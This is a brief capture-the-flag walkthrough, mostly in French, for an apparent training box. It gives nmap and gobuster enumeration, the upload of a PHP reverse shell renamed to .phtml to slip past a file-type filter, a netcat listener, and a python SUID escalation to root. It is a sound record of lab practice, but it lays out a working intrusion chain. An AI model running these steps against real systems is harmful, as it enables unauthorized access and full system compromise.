## Nmap
On fait la commande nmap -sC -sv ip_machine
## What is the hidden directory?
gobuster dir -u http://10.10.19.26 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/panel/

##Shell
copier dans le bureau le fichier php shell usr/share/webshells/php
ensuite on édite le fichier avec nano et on remplace l'ip par celle de notre machine
remplacer l'extension .php par .phtml
puis le shell s'ouvre
possible de le stabiliser https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
faire la commande netcat -lnvp 1234
find / -type f -name user.txt
cat /var/www/user.txt

python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
on est root
cat root.txt
